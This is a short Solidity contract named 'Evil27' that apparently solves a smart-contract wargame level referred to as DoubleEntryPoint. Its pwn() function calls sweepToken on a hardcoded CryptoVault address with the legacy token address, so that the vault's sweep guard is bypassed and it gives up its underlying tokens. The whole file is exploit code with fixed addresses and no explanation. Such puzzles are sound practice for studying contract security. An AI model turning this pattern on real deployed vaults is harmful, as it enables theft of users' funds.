// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Evil27 {
    address legacyToken = 0xAd3d1f8a9C8D3486F878aace358C3e3a8398986c;
    address underlying = 0xdAb61F4eb58aD85666C8dedE66D2C5AeCB3DB6E1; // DoubleEntryPoint
    address cryptoVault = 0x491ab84372e3A65d2cf22D2ee6c6dcC8bfF61310;

    function pwn() public {
        cryptoVault.call(
            abi.encodeWithSignature(
                "sweepToken(address)",
                0xAd3d1f8a9C8D3486F878aace358C3e3a8398986c
            )
        );
    }
}
